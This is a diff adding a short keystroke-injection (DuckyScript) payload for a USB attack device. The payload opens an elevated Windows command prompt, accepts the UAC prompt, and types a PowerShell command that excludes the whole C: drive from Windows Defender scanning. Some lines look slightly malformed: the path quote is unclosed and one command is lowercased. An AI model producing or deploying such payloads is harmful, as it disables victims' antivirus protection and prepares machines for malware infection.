@@ -1,0 +1,15 @@
+LOCALE GB
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd.exe
+DELAY 400
+CTRL SHIFT ENTER
+DELAY 1500
+ALT Y
+DELAY 1000
+STRING powershell -Command Add-MpPreference -ExclusionPath "c:\
+DELAY 1000
+ENTER
+DELAY 500
+string exit
